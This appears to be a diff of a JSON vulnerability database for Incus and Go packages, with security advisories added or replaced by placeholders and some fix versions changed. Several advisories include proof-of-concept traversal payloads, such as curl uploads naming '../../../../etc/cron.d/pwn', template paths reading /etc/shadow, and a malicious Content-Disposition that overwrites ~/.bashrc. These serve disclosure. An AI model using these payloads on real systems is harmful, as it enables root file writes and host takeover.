-                "description": "## Summary `POST /1.0/instances` with an `application/octet-stream` body (instance backup import) reads the instance name from the tarball's `backup/index.yaml` verbatim and uses it as an on-disk path segment. A project user with the `can_create_instances` entitlement can set `name: ../../../../etc/cron.d/x`, causing the root Incus daemon to create a directory and unpack attacker-controlled tarball content outside the storage pool - before any name validation runs. This yields arbitrary directory creation and arbitrary-content file write as root, and thus host RCE. ## Root Cause In `createFromBackup` (`cmd/incusd/instances_post.go`), the tarball metadata is parsed by `backup.GetInfo` (`internal/server/backup/backup_info.go:64-160`), which loads `result.Name` straight from `index.yaml` via YAML unmarshal with NO validation - no `filepath.Clean`, no `IsAPIName`, no `/` or `..` rejection. The name then flows to `pool.CreateInstanceFromBackup` -> `project.Instance(srcBackup.Project, srcBackup.Name)` (`internal/server/storage/backend.go:744`) -> `vol.MountPath()` -> `GetVolumeMountPath` = `VarPath('storage-pools', pool, 'containers', <name>)` -> `EnsureMountPath` `os.Mkdir` + `CreateVolumeFromBackup` content unpack. `instance.ValidName` exists only at `instances_post.go:1452`, which is on the JSON-dispatch path and is never reached for the octet-stream branch (dispatch returns at `:1157`). ## Impact Root-owned arbitrary directory creation and arbitrary-content file write outside the storage pool (e.g. `/etc/cron.d/`), leading to host remote code execution. Snapshot names (`bInfo.Snapshots[]`) are a second identical vector. ## Proof of Concept 1. Build an instance backup tarball whose `backup/index.yaml` sets `name: ../../../../etc/cron.d/pwn` and whose `container/rootfs` contains a crafted cron file body. 2. `curl -X POST --data-binary @backup.tar -H 'Content-Type: application/octet-stream' https://incus/1.0/instances` (as a user with `can_create_instances`). 3. The daemon writes attacker content to `/etc/cron.d/pwn` as root. ## Attack Chain 1. Entry: `POST /1.0/instances`, `Content-Type: application/octet-stream`, no `X-Incus-name`. Guard: none for this branch -> `createFromBackup` (`instances_post.go:1157`). 2. Parse: `bInfo, _ := backup.GetInfo(backupFile, ...)` (`instances_post.go:851`) reads `Name` from `index.yaml`. Guard: `GetInfo` (`backup_info.go:64-160`) - none. Bypass proof: field returned untouched from YAML unmarshal; no `Clean`/`IsAPIName`/`..` check in the function (verified at HEAD). 3. Restriction check: `AllowInstanceCreation` (`instances_post.go:871`) validates project restrictions only, not name syntax. Passes. 4. Sink: `pool.CreateInstanceFromBackup(*bInfo, ...)` (`instances_post.go:992`) -> `project.Instance(proj, bInfo.Name)` (`backend.go:744`) -> `vol.MountPath()` -> `EnsureMountPath` `os.Mkdir` (`internal/server/storage/drivers/volume.go`) + content unpack, as root, BEFORE `internalImportFromBackup` and BEFORE the unreachable `ValidName` at `:1452`. 5. Impact: root arbitrary dir create + attacker-content file write -> host RCE. ## Bypass Evidence No guard exists between the tarball name and the disk write. Go's `filepath.Join` collapses `..`: `filepath.Join('/var/lib/incus/storage-pools/p/containers','../../../../etc/cron.d/x')` = `/var/lib/etc/cron.d/x` (verified by running it; deeper `..` reaches `/etc/cron.d/x`). Same class as CVE-2026-48753 but a distinct, unfixed entry point (record name used as path segment, not a symlink inside the archive payload). ## Affected Versions `<= 7.2.0` (vulnerable code verified present on latest release tag v7.2.0 and on HEAD 60d85b3e; no fix commit on `cmd/incusd/instances_post.go` between v7.2.0 and HEAD). ## Suggested Fix Apply `instance.ValidName(bInfo.Name, false)` (and validate each snapshot name) immediately after `backup.GetInfo`, before any storage I/O. ## Credit Vulnerability independently discovered and responsibly disclosed by Zhixi 'Jace' Sun (@manus-use).",
+                "title": "Title Not Available",
+                "description": "Description Not Available",
                 "severity": "CRITICAL",
                 "status": "open",
                 "events": [
@@ -1455,8 +1455,8 @@
             },
             "CVE-2026-81497": {
                 "cve_id": "CVE-2026-81497",
-                "title": "security update",
-                "description": "security update",
+                "title": "Arbitrary host file read+write via VM template path traversal (incomplete fix of CVE-2026-48752)",
+                "description": "### Summary The fix for **CVE-2026-48752** (`GHSA-vxp5-584q-c479`, template-traversal to host read/write, addressed in **7.2.0**) was applied to the **LXC container driver only**. The sibling **QEMU/VM driver's** template path (`driver_qemu.go` \u2192 `templateApplyNow`) never received the same guard, so its template read and write remain unbounded. An authenticated user who can **create/launch a VM from a custom image**, or **restore a VM backup**, controls the image/backup `metadata.yaml` (the `templates` map and each `tpl.Template` value) and can traverse out of the templates directory to: - **read arbitrary host files** as root, which are then disclosed into the guest, and - **create root-owned files anywhere on the host** (with a `.out` suffix). ### Details The **LXC driver** was hardened for CVE-2026-48752 (`internal/server/instance/drivers/driver_lxc.go`): ```go os.OpenRoot(d.RootfsPath()) // ~:7493 confines writes if filepath.Base(tpl.Template) != tpl.Template // ~:7515 rejects any '/', blocks all '../' os.Lstat(d.TemplatesPath()) ... ModeSymlink // ~:7519 / ~:7533 rejects symlinked dir/source ``` The **QEMU/VM driver received none of these**. `driver_qemu.go` \u2192 `templateApplyNow` (func @ `:3712`) has, before its file operations, only a `slices.Contains(tpl.When, trigger)` check. There is **no path validation**: ```go // READ ~:3779 -- raw tpl.Template, no containment tplString, err := os.ReadFile(filepath.Join(d.TemplatesPath(), tpl.Template)) // WRITE ~:3765 -- raw tpl.Template, path is host-side under incusd (root) w, err = os.Create(filepath.Join(path, fmt.Sprintf('%s.out', tpl.Template))) ``` - **READ vector:** `tpl.Template = '../../../../etc/shadow'` reads an arbitrary host file, which is rendered into the VM config drive (`config/files/*.out`, exported to the guest over 9p/virtiofs) \u2192 **host-file disclosure to the attacker's guest**. Cleanest, exact-path vector. - **WRITE vector:** `tpl.Template = '../../../../etc/cron.d/x'` creates `/etc/cron.d/x.out`, a **root-owned file anywhere on the host** with pongo2-rendered content. A grep for `os.OpenRoot` / `OpenTemplates` over the templates directory in the incus QEMU path returns **zero hits**. Reachability: `templateApplyNow` is invoked from `generateConfigShare` on **VM start**, so the static call path is strong. **Reference remediation.** Apply incus's own LXC-driver guards (the `filepath.Base` reject + `os.OpenRoot` confinement) to `driver_qemu.go` \u2192 `templateApplyNow`, covering both the read and the write. For the **read** specifically, upstream **LXD** is a second reference (it confines the QEMU read via `d.OpenTemplates()`, an `os.Root`). Note that **LXD does *not* confine the QEMU write either**, so the write reference is incus's own LXC guard, not LXD. **Scope / honesty.** Source-confirmed via a white-box review of the public repo at fresh HEAD (`ccdf811`) plus an LXD cross-reference; the guard absence was grep-verified. A live-VM end-to-end PoC is the documented next step. The read is a clean arbitrary host-file disclosure. The write is a genuine root-owned arbitrary-file-create primitive, but the created path is **forced to carry a `.out` suffix**, which constrains a direct write-to-RCE, so this is framed as **High**, not a 9.9 Critical, and no RCE is claimed without a `.out`-compatible execution path. ### PoC On a self-hosted **incus 7.2.0 or later**, craft a VM image whose `metadata.yaml` contains: ```yaml templates: '/x': template: '../../../../../../tmp/incus-poc' when: - start ``` Launch the VM, then confirm on the host: ```bash ls -l /tmp/incus-poc.out # created by incusd (root) = out-of-templates write ``` Separately, a `tpl.Template` of `../../etc/hostname` is read and disclosed into the guest config drive (`config/files/*.out`). ### Impact **Path traversal (CWE-22) + link following (CWE-59)** in the VM/QEMU template path. An authenticated user able to create/launch a VM from a custom image, or restore a VM backup, can: 1. **read arbitrary host files as root**, disclosed into their guest (e.g. `/etc/shadow`), and 2. **create root-owned files** with attacker-controlled content anywhere on the host (`.out`-suffixed). **Undisclosed.** The authoritative public dissection ([Snyk Labs: *Newlines, Symlinks, and Arbitrary Writes: Dissecting High-Severity Vulnerabilities in Incus*](https://labs.snyk.io/resources/incus-vulnerabilities-newline-symlink-arbitrary-writes/)) covers **only** `driver_lxc.go` and explicitly notes the VM drivers were not separately audited; no incus issue, PR, or CVE names `driver_qemu.go` \u2192 `templateApplyNow`. --- **Reporter:** Kingsley Olukanni (GitHub: **babakizo420**).",
                 "severity": "HIGH",
                 "status": "open",
                 "events": [
@@ -1481,8 +1481,8 @@
             },
             "CVE-2026-81499": {
                 "cve_id": "CVE-2026-81499",
-                "title": "[GHSA-6v6x-387m-rj4w: Project restriction bypass on network addre",
-                "description": "[GHSA-6v6x-387m-rj4w: Project restriction bypass on network address sets]",
+                "title": "Project restriction bypass on network address sets",
+                "description": "### Summary The network address set API is missing from the auth object project-expansion switch, so a project-restricted client can read and rewrite the default project's address sets. ### Details **Project confinement bypass on the network address set API** All six handlers in cmd/incusd/network_address_sets.go resolve the effective project via project.NetworkProject(), which returns 'default' when the project does not have features.networks set. But expandProject in cmd/incusd/daemon.go (lines 326-372) has no branch for auth.ObjectTypeNetworkAddressSet, so the authorization object is constructed with the requested project instead of the effective one. Verified against the switch at HEAD c0ca96d, which handles Profile (352), StorageBucket (354), StorageVolume (356), NetworkZone (363), Image/ImageAlias (365) and Network/NetworkACL (367) \u2014 NetworkAddressSet appears nowhere. Consequence: a certificate restricted to project P can read, rewrite, rename and delete the default project's address sets, which feed network ACL rules for every other tenant. features.networks defaults to false at project creation, so this is the default state of every project, not an unusual configuration. Supporting evidence: the sibling auth.ObjectTypeNetworkACL is expanded on the same line, and the address-set LIST endpoint filters on the real project and correctly returns nothing \u2014 this is the only mismatch found when diffing every cmd/incusd caller of an effective-project resolver against the object types passed to allowPermission. ### Suggested fixes Add auth.ObjectTypeNetworkAddressSet to the expansion in expandProject alongside Network and NetworkACL. More durably, make expandProject fail closed on an unhandled object type rather than returning the requested project, so a future new API cannot repeat this. ### Tooling and credit AI assistance was used during investigation; the reporter read the full expandProject switch and confirmed the missing object type against its expanded siblings at HEAD, and independently confirmed the os.WriteFile call in instance_metadata.go.",
                 "severity": "",
                 "status": "open",
                 "events": [
@@ -1494,8 +1494,8 @@
             },
             "CVE-2026-81500": {
                 "cve_id": "CVE-2026-81500",
-                "title": "Incus CLI path traversal when exporting an image from a malicious server",
-                "description": "## Summary The `incus` CLI, when exporting or copying an image from a remote server into a directory target, takes the local filename verbatim from the server-controlled `Content-Disposition: filename=` for UNIFIED images and passes it into `os.Rename(tmp, filepath.Join(target, resp.MetaName))` with no `filepath.Base` / traversal check. A malicious or MITM'd image server that the user points the CLI at can therefore write the downloaded (attacker-controlled) image bytes to an arbitrary path on the client, escaping the export directory \u2014 e.g. overwrite `~/.bashrc` \u2192 code execution on the client's next shell. ## Root Cause On the unified-image branch (`client/incus_images.go:339`, forced by the server not sending a `multipart/form-data` Content-Type), `mime.ParseMediaType(Content-Disposition)` yields `filename = cdParams['filename']` and `resp.MetaName = filename` is stored verbatim at `client/incus_images.go:356` with NO `filepath.Base`. It then reaches `os.Rename(targetMeta, filepath.Join(target, resp.MetaName))` at `cmd/incus/image.go:641`. The multipart/split branch is SAFE because it uses `multipart.Part.FileName()`, which basenames the value. The hash guard `if imageType != 'oci' && !strings.HasPrefix(hash, fingerprint)` at `client/incus_images.go:360` is bypassable: (a) the server sets response header `X-Incus-Type: oci` (`:254`) \u2192 check skipped entirely; or (b) when the user passes an alias, `fingerprint` is itself server-controlled via `dereferenceAlias`\u2192`GetImageAliasType().Target` (`image.go:133-142`), so the attacker sets it to `sha256(malicious_bytes)` and `HasPrefix` passes. ## Impact Arbitrary file overwrite on the client as the invoking user \u2192 code execution (shell rc, cron, SSH config). The attacker is a remote/MITM'd image server; the victim must run `incus image export`/`copy` into a directory target from that remote. Pointing the CLI at public/untrusted image servers is a normal Incus workflow. ## Proof of Concept ``` # Malicious image server. Victim runs: incus image export evil:someimg ~/Downloads/ # Server responds to the /export request with: # HTTP/1.1 200 OK # X-Incus-Type: oci # bypass (a): skips hash check # Content-Type: application/octet-stream # forces unified branch (not multipart) # Content-Disposition: attachment; filename='../../../../home/victim/.bashrc' # <attacker payload bytes> # Client: resp.MetaName = '../../../../home/victim/.bashrc' (no filepath.Base) # os.Rename(tmp, filepath.Join('~/Downloads', resp.MetaName)) -> overwrites ~/.bashrc # -> code execution as victim on next interactive shell. ``` ## Attack Chain 1. **Entry:** victim runs `incus image export evil:x ~/Downloads/` (directory target). `IsDir(target)` true \u2192 `cmd/incus/image.go:569-575`, `606` `GetImageFile`, `639-641` rename branch. - **Guard:** none on the server-provided name. 2. **Branch force:** attacker server responds with a non-`multipart/form-data` Content-Type \u2192 unified branch `client/incus_images.go:339` (multipart branch `:286` skipped). - **Guard:** branch selection. **Bypass proof:** attacker controls Content-Type. 3. **Tainted name:** `mime.ParseMediaType(Content-Disposition)` \u2192 `resp.MetaName = filename` at `client/incus_images.go:356`, NO `filepath.Base`. - **Guard:** `mime.ParseMediaType` filename param. **Bypass proof:** `go run` confirmed it returns `../../../../home/victim/.bashrc` verbatim, unlike `part.FileName()` (basenames to `evil`) in the multipart branch (`:310`). 4. **Hash guard:** `client/incus_images.go:360` `if imageType != 'oci' && !strings.HasPrefix(hash, fingerprint)`. - **Bypass proof (a):** response header `X-Incus-Type: oci` (`:254`) \u2192 check skipped (source-verified). **(b):** alias-derived `fingerprint` = `GetImageAliasType().Target` is server-controlled (`image.go:133-142`) \u2192 attacker sets `sha256(malicious)`; `HasPrefix` passes (source-verified). 5. **Sink:** `os.Rename(targetMeta, filepath.Join('~/Downloads', '../../../../home/victim/.bashrc'))` at `cmd/incus/image.go:641` \u2192 writes attacker bytes to `~/.bashrc`. - **Bypass proof:** `go run` confirmed `os.Rename` across the collapsed `../` escaped the dir and overwrote the target. 6. **Impact:** arbitrary file overwrite on the client as the invoking user \u2192 RCE. ## Bypass Evidence - `resp.MetaName = filename` at `client/incus_images.go:356` with no sanitization; `os.Rename(...filepath.Join(target, resp.MetaName))` at `cmd/incus/image.go:641`. `grep filepath.Base` \u2192 only in the upload/import path (`image.go:834/836`), never between `:356` and `:641`. - `go run` proofs: `mime.ParseMediaType` returns `../` verbatim; `part.FileName()` basenames (safe branch asymmetry); `os.Rename` across `../` overwrites the escaped target. - DISTINCT from GHSA-f6m5-xw2g-xc4x / CVE-2026-48769: that advisory's DETAILS are the DAEMON (`cmd/incusd/daemon_images.go`, `os.Create`, trusting `Incus-Image-Hash` for `source.type=url`, writing under `/var/lib/incus/images/`). This report covers the CLI CLIENT (`client/incus_images.go` + `cmd/incus/image.go`, `os.Rename`, trusting `Content-Disposition`, writing on the user's local filesystem). Different component, tainted header, sink, and fix. ## Affected Versions `<= 7.3.0` (Go module `github.com/lxc/incus/v7`). Sinks verified present on the v7.3.0 release tag (`90429bf`): `resp.MetaName = filename` at `client/incus_images.go:356` with no sanitization, the hash gate still keyed on the server-supplied `X-Incus-Type` header at `:254`/`:360`, and the `os.Rename` sink at `cmd/incus/image.go:641`. Confirmed still present on `main`. ## Suggested Fix Apply `filepath.Base` to `resp.MetaName` (and `resp.RootfsName`) on the unified-image branch before `os.Rename`, mirroring the multipart branch's use of `part.FileName()`; reject any name containing path separators or `..`. --- Reported by zx (Jace) \u2014 GitHub: @manus-use",
+                "title": "[Unknown description]",
+                "description": "[Unknown description]",
                 "severity": "",
                 "status": "open",
                 "events": [
@@ -1559,8 +1559,8 @@
             },
             "GHSA-jh4v-j34r-2mgh": {
                 "cve_id": "GHSA-jh4v-j34r-2mgh",
-                "title": "Title Not Available",
-                "description": "Description Not Available",
+                "title": "Project restriction bypass for custom volume copy with omitted source type",
+                "description": "### Summary Creating a custom storage volume with a `source` volume but no `source.type` is handled as a copy, but the source volume access check only applies when `source.type` is explicitly set to `copy`. A request that omits the type goes straight to the copy code path with a caller-controlled `source.project`. ### Impact Any client allowed to create custom volumes in a project can copy any custom volume from any other project on the server, including its snapshots and configuration, and read its contents, defeating project isolation. ### Details The `POST /1.0/storage-pools/{pool}/volumes/custom` endpoint only checks `can_create_storage_volumes` on the target project. The `can_view` check on the source volume added for CVE-2026-55621 lives in the `copy` arm of the source type switch, while the empty type arm calls the same copy helper without it. The official client always sets `source.type` to `copy`, so the empty form is only reachable through a crafted request.",
                 "severity": "HIGH",
                 "status": "open",
                 "events": [
@@ -1585,8 +1585,8 @@
             },
             "GHSA-mmj7-8rgf-mx2h": {
                 "cve_id": "GHSA-mmj7-8rgf-mx2h",
-                "title": "Title Not Available",
-                "description": "Description Not Available",
+                "title": "Read of other bucket objects via unsigned header on presigned S3 upload URL",
+                "description": "### Summary The in-process S3 server used for storage buckets on local storage pools verifies SigV4 signatures over the headers listed by the client in `X-Amz-SignedHeaders`, but never checks that every `x-amz-*` header present on the request is in that list. The SigV2 presigned path doesn't include those headers in the string to sign at all. A request can therefore carry unsigned `x-amz-*` headers that change how it is handled, which AWS S3 refuses. ### Impact Anyone holding a presigned upload URL for a single object, without any bucket credentials, can add an unsigned `X-Amz-Copy-Source` header and have the server copy any other object in the same bucket onto the granted key, with the copy performed under the signer's credentials. If the holder can also read the target key, for instance through a matching presigned download URL, this discloses the contents of arbitrary objects in the bucket. The response also leaks the ETag of the source object. All storage pool drivers using the built-in S3 server are affected. Ceph radosgw buckets are not, and the bucket listener (`core.storage_buckets_address`) is disabled by default. ### Details The canonical request only iterates over the client-supplied signed header list, so headers outside that list are never seen by the signature check. The object handler routes any PUT carrying `X-Amz-Copy-Source` to the copy path based on the header alone, so a write grant becomes a read within the bucket. The same gap exists on the `Authorization` header path, and the SigV2 presigned path omits the `CanonicalizedAmzHeaders` section entirely. ### Workarounds Don't hand out presigned URLs for buckets that also hold sensitive objects, or keep the bucket listener disabled.",
                 "severity": "HIGH",
                 "status": "open",
                 "events": [
@@ -1611,8 +1611,8 @@
             },
             "GHSA-x8gj-2q73-qr6j": {
                 "cve_id": "GHSA-x8gj-2q73-qr6j",
-                "title": "Restricted client can read storage bucket keys in the default project",
-                "description": "### Summary The storage bucket key endpoints, `GET /1.0/storage-pools/{pool}/buckets/{bucket}/keys` and `GET .../keys/{key}`, only require `can_view` on the bucket and return the S3 access key and secret key. When using the TLS authorizer, a restricted client certificate is granted read-only access to buckets in the `default` project, so that projects without `features.storage.buckets` can use them. That read-only exception therefore also hands out the bucket credentials. ### Impact A client with a restricted TLS certificate scoped to any project can read the access key and secret key of every bucket in the `default` project, then use them directly against the S3 endpoint to read, modify or delete the objects in those buckets. Only the TLS authorizer is affected. OpenFGA deployments are not. ### Details Bucket keys are credentials rather than metadata, so both key retrieval endpoints now require `can_edit` on the bucket. Listing buckets and reading bucket details remain available under `can_view`. ### Workarounds Don't keep buckets in the `default` project on servers that issue restricted client certificates, or rotate the keys of any bucket a restricted client may have read.",
+                "title": "Title Not Available",
+                "description": "Description Not Available",
                 "severity": "HIGH",
                 "status": "open",
                 "events": [
@@ -1623,7 +1623,7 @@
                 ]
             }
         },
-        "10": {
+        "8": {
             "CVE-2025-58183": {
                 "cve_id": "CVE-2025-58183",
                 "title": "tar.Reader does not set a maximum size on the number of sparse re ...",
@@ -1633,7 +1633,7 @@
                 "events": [
                     {
                         "introduced": "6.15-2.fc43",
-                        "fixed": "6.23-3.fc43",
+                        "fixed": "6.23-2.fc43",
                         "identifier": "fc43"
                     },
                     {
@@ -1691,7 +1691,7 @@
                 "events": [
                     {
                         "introduced": "6.15-2.fc43",
-                        "fixed": "6.23-3.fc43",
+                        "fixed": "6.23-2.fc43",
                         "identifier": "fc43"
                     },
                     {
@@ -1710,7 +1710,7 @@
                 "events": [
                     {
                         "introduced": "6.15-2.fc43",
-                        "fixed": "6.23-3.fc43",
+                        "fixed": "6.23-2.fc43",
                         "identifier": "fc43"
                     },
                     {
@@ -1729,7 +1729,7 @@
                 "events": [
                     {
                         "introduced": "6.15-2.fc43",
-                        "fixed": "6.23-3.fc43",
+                        "fixed": "6.23-2.fc43",
                         "identifier": "fc43"
                     },
                     {
@@ -1748,7 +1748,7 @@
                 "events": [
                     {
                         "introduced": "6.15-2.fc43",
-                        "fixed": "6.23-3.fc43",
+                        "fixed": "6.23-2.fc43",
                         "identifier": "fc43"
                     },
                     {
@@ -1767,7 +1767,7 @@
                 "events": [
                     {
                         "introduced": "6.15-2.fc43",
-                        "fixed": "6.23-3.fc43",
+                        "fixed": "6.23-2.fc43",
                         "identifier": "fc43"
                     },
                     {
@@ -1786,7 +1786,7 @@
                 "events": [
                     {
                         "introduced": "6.15-2.fc43",
-                        "fixed": "6.23-3.fc43",
+                        "fixed": "6.23-2.fc43",
                         "identifier": "fc43"
                     },
                     {
@@ -1805,7 +1805,7 @@
                 "events": [
                     {
                         "introduced": "6.15-2.fc43",
-                        "fixed": "6.23-3.fc43",
+                        "fixed": "6.23-2.fc43",
                         "identifier": "fc43"
                     },
                     {
@@ -1824,7 +1824,7 @@
                 "events": [
                     {
                         "introduced": "6.15-2.fc43",
-                        "fixed": "6.23-3.fc43",
+                        "fixed": "6.23-2.fc43",
                         "identifier": "fc43"
                     }
                 ]
@@ -2240,8 +2240,8 @@
             },
             "CVE-2026-81495": {
                 "cve_id": "CVE-2026-81495",
-                "title": "Arbitrary file write on host via path traversal in custom volume import",
-                "description": "## Summary `POST /1.0/storage-pools/<pool>/volumes` with an `application/octet-stream` body (custom-volume ISO or backup import) uses an attacker-controlled name as an on-disk path segment without validation. A project user with the `can_create_storage_volumes` entitlement can supply `X-Incus-name: ../../../../<target>` (ISO) or an `index.yaml name: ../../../../<target>` (backup), causing the root Incus daemon to create directories, remove directory trees (`os.RemoveAll`), and (backup vector) unpack attacker content outside the storage pool. The `validate.IsAPIName` guard exists only on the JSON create branch and is never reached on the import branches. ## Root Cause In `storagePoolVolumesPost` (`cmd/incusd/storage_volumes.go:828-833`), octet-stream requests dispatch to `createStoragePoolVolumeFromISO(..., r.Header.Get('X-Incus-name'))` (`:830`) or `createStoragePoolVolumeFromBackup(...)` (`:833`) BEFORE the `validate.IsAPIName(req.Name)` at `:845` (which is only on the JSON branch). `createStoragePoolVolumeFromISO` (`:2697`) checks only `volName == ''` (`:2701`). The name flows to `pool.CreateCustomVolumeFromISO(projectName, volName, ...)` -> `project.StorageVolume(projectName, volName)` -> `GetVolume(...).MountPath()` -> `dir.CreateVolume` `EnsureMountPath` `os.Mkdir` + reverter `os.RemoveAll(volPath)`. `VolumeDBCreate`/`validateVolume` validate config keys only, not the name (verified - no `ValidName`/`IsAPIName`/`filepath` check in either). ## Impact Root-owned arbitrary directory creation and directory-tree removal (`os.RemoveAll`) at an attacker-chosen path (integrity/DoS). The backup import vector additionally unpacks tarball rootfs bytes, giving arbitrary-content file write as root -> host RCE. ## Proof of Concept ISO: `curl -X POST --data-binary @x.iso -H 'Content-Type: application/octet-stream' -H 'X-Incus-type: iso' -H 'X-Incus-name: ../../../../etc/cron.d/pwn' https://incus/1.0/storage-pools/default/volumes` (as a user with `can_create_storage_volumes`). ## Attack Chain 1. Entry: `POST /1.0/storage-pools/<pool>/volumes`, `Content-Type: application/octet-stream`, `X-Incus-type: iso`, `X-Incus-name: ../../../../etc/cron.d/x` -> `createStoragePoolVolumeFromISO` (`storage_volumes.go:830`). Guard: `allowPermission(project, can_create_storage_volumes)`. 2. Check: `if volName == ''` (`:2701`) - rejects only empty. `validate.IsAPIName(req.Name)` (`:845`) is on the JSON branch, not reached. Bypass proof: `volName` passes with any value including the traversal string. 3. Sink: `pool.CreateCustomVolumeFromISO(projectName, volName, ...)` (`backend.go`) -> `project.StorageVolume(proj, volName)` -> `GetVolume(...).MountPath()` -> `EnsureMountPath` `os.Mkdir` + reverter `os.RemoveAll(volPath)`, as root. `VolumeDBCreate`->`validateVolume` validates config keys only (verified). 4. Impact: root arbitrary dir create + directory-tree removal at attacker path; backup vector adds arbitrary-content write (RCE). ## Bypass Evidence `validate.IsAPIName` present but on the wrong branch (`:845`, JSON only); import branches (`:830`/`:833`) bypass it; downstream validation is config-only. `filepath.Join` collapse verified (same as the instance backup-import path). Forced `.iso` suffix constrains the final filename but still permits arbitrary-directory creation/removal via `..`. ## Affected Versions `<= 7.2.0` (vulnerable code verified present on latest release tag v7.2.0 and on HEAD 60d85b3e; no fix commit on `cmd/incusd/storage_volumes.go` between v7.2.0 and HEAD). ## Suggested Fix Apply `validate.IsAPIName(volName, false)` to the `X-Incus-name` header and to `bInfo.Name`/each volume-snapshot name at handler entry, before any storage I/O. ## Credit Vulnerability independently discovered and responsibly disclosed by Zhixi 'Jace' Sun (@manus-use).",
+                "title": "Title Not Available",
+                "description": "Description Not Available",
                 "severity": "CRITICAL",
                 "status": "open",
                 "events": [
@@ -2253,8 +2253,8 @@
             },
             "CVE-2026-81496": {
                 "cve_id": "CVE-2026-81496",
-                "title": "Arbitrary file write on host via path traversal in instance backup import",
-                "description": "## Summary `POST /1.0/instances` with an `application/octet-stream` body (instance backup import) reads the instance name from the tarball's `backup/index.yaml` verbatim and uses it as an on-disk path segment. A project user with the `can_create_instances` entitlement can set `name: ../../../../etc/cron.d/x`, causing the root Incus daemon to create a directory and unpack attacker-controlled tarball content outside the storage pool - before any name validation runs. This yields arbitrary directory creation and arbitrary-content file write as root, and thus host RCE. ## Root Cause In `createFromBackup` (`cmd/incusd/instances_post.go`), the tarball metadata is parsed by `backup.GetInfo` (`internal/server/backup/backup_info.go:64-160`), which loads `result.Name` straight from `index.yaml` via YAML unmarshal with NO validation - no `filepath.Clean`, no `IsAPIName`, no `/` or `..` rejection. The name then flows to `pool.CreateInstanceFromBackup` -> `project.Instance(srcBackup.Project, srcBackup.Name)` (`internal/server/storage/backend.go:744`) -> `vol.MountPath()` -> `GetVolumeMountPath` = `VarPath('storage-pools', pool, 'containers', <name>)` -> `EnsureMountPath` `os.Mkdir` + `CreateVolumeFromBackup` content unpack. `instance.ValidName` exists only at `instances_post.go:1452`, which is on the JSON-dispatch path and is never reached for the octet-stream branch (dispatch returns at `:1157`). ## Impact Root-owned arbitrary directory creation and arbitrary-content file write outside the storage pool (e.g. `/etc/cron.d/`), leading to host remote code execution. Snapshot names (`bInfo.Snapshots[]`) are a second identical vector. ## Proof of Concept 1. Build an instance backup tarball whose `backup/index.yaml` sets `name: ../../../../etc/cron.d/pwn` and whose `container/rootfs` contains a crafted cron file body. 2. `curl -X POST --data-binary @backup.tar -H 'Content-Type: application/octet-stream' https://incus/1.0/instances` (as a user with `can_create_instances`). 3. The daemon writes attacker content to `/etc/cron.d/pwn` as root. ## Attack Chain 1. Entry: `POST /1.0/instances`, `Content-Type: application/octet-stream`, no `X-Incus-name`. Guard: none for this branch -> `createFromBackup` (`instances_post.go:1157`). 2. Parse: `bInfo, _ := backup.GetInfo(backupFile, ...)` (`instances_post.go:851`) reads `Name` from `index.yaml`. Guard: `GetInfo` (`backup_info.go:64-160`) - none. Bypass proof: field returned untouched from YAML unmarshal; no `Clean`/`IsAPIName`/`..` check in the function (verified at HEAD). 3. Restriction check: `AllowInstanceCreation` (`instances_post.go:871`) validates project restrictions only, not name syntax. Passes. 4. Sink: `pool.CreateInstanceFromBackup(*bInfo, ...)` (`instances_post.go:992`) -> `project.Instance(proj, bInfo.Name)` (`backend.go:744`) -> `vol.MountPath()` -> `EnsureMountPath` `os.Mkdir` (`internal/server/storage/drivers/volume.go`) + content unpack, as root, BEFORE `internalImportFromBackup` and BEFORE the unreachable `ValidName` at `:1452`. 5. Impact: root arbitrary dir create + attacker-content file write -> host RCE. ## Bypass Evidence No guard exists between the tarball name and the disk write. Go's `filepath.Join` collapses `..`: `filepath.Join('/var/lib/incus/storage-pools/p/containers','../../../../etc/cron.d/x')` = `/var/lib/etc/cron.d/x` (verified by running it; deeper `..` reaches `/etc/cron.d/x`). Same class as CVE-2026-48753 but a distinct, unfixed entry point (record name used as path segment, not a symlink inside the archive payload). ## Affected Versions `<= 7.2.0` (vulnerable code verified present on latest release tag v7.2.0 and on HEAD 60d85b3e; no fix commit on `cmd/incusd/instances_post.go` between v7.2.0 and HEAD). ## Suggested Fix Apply `instance.ValidName(bInfo.Name, false)` (and validate each snapshot name) immediately after `backup.GetInfo`, before any storage I/O. ## Credit Vulnerability independently discovered and responsibly disclosed by Zhixi 'Jace' Sun (@manus-use).",
+                "title": "Title Not Available",
+                "description": "Description Not Available",
                 "severity": "CRITICAL",
                 "status": "open",
                 "events": [
@@ -2266,8 +2266,8 @@
             },
             "CVE-2026-81497": {
                 "cve_id": "CVE-2026-81497",
-                "title": "security update",
-                "description": "security update",
+                "title": "Arbitrary host file read+write via VM template path traversal (incomplete fix of CVE-2026-48752)",
+                "description": "### Summary The fix for **CVE-2026-48752** (`GHSA-vxp5-584q-c479`, template-traversal to host read/write, addressed in **7.2.0**) was applied to the **LXC container driver only**. The sibling **QEMU/VM driver's** template path (`driver_qemu.go` \u2192 `templateApplyNow`) never received the same guard, so its template read and write remain unbounded. An authenticated user who can **create/launch a VM from a custom image**, or **restore a VM backup**, controls the image/backup `metadata.yaml` (the `templates` map and each `tpl.Template` value) and can traverse out of the templates directory to: - **read arbitrary host files** as root, which are then disclosed into the guest, and - **create root-owned files anywhere on the host** (with a `.out` suffix). ### Details The **LXC driver** was hardened for CVE-2026-48752 (`internal/server/instance/drivers/driver_lxc.go`): ```go os.OpenRoot(d.RootfsPath()) // ~:7493 confines writes if filepath.Base(tpl.Template) != tpl.Template // ~:7515 rejects any '/', blocks all '../' os.Lstat(d.TemplatesPath()) ... ModeSymlink // ~:7519 / ~:7533 rejects symlinked dir/source ``` The **QEMU/VM driver received none of these**. `driver_qemu.go` \u2192 `templateApplyNow` (func @ `:3712`) has, before its file operations, only a `slices.Contains(tpl.When, trigger)` check. There is **no path validation**: ```go // READ ~:3779 -- raw tpl.Template, no containment tplString, err := os.ReadFile(filepath.Join(d.TemplatesPath(), tpl.Template)) // WRITE ~:3765 -- raw tpl.Template, path is host-side under incusd (root) w, err = os.Create(filepath.Join(path, fmt.Sprintf('%s.out', tpl.Template))) ``` - **READ vector:** `tpl.Template = '../../../../etc/shadow'` reads an arbitrary host file, which is rendered into the VM config drive (`config/files/*.out`, exported to the guest over 9p/virtiofs) \u2192 **host-file disclosure to the attacker's guest**. Cleanest, exact-path vector. - **WRITE vector:** `tpl.Template = '../../../../etc/cron.d/x'` creates `/etc/cron.d/x.out`, a **root-owned file anywhere on the host** with pongo2-rendered content. A grep for `os.OpenRoot` / `OpenTemplates` over the templates directory in the incus QEMU path returns **zero hits**. Reachability: `templateApplyNow` is 